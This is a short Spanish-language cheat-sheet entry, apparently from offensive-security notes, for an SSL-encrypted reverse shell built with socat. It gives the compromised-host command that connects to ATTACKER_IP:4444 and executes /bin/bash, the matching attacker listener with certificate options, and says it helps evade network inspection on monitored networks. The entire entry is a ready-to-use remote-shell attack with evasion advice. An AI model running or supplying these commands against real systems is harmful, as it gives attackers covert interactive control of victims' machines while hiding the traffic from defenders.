# Socat Reverse Shell — SSL

## Descripción

Esta reverse shell utiliza una conexión SSL para cifrar el tráfico entre la máquina comprometida y la máquina atacante.

Esto puede ayudar a evadir algunos sistemas de inspección de red.

---

# Comando

```bash
socat OPENSSL:ATTACKER_IP:4444 EXEC:/bin/bash
```

---

# Listener

```bash
socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,fork -
```

---

# Requisitos

* socat con soporte SSL
* certificados TLS

---

# Explicación

```
OPENSSL                → conexión cifrada
ATTACKER_IP:4444       → destino
EXEC:/bin/bash         → ejecuta shell
```

---

# Cuándo usarlo

* cuando se requiere cifrado
* redes monitorizadas

---

# Limitaciones

* requiere certificados
* configuración adicional

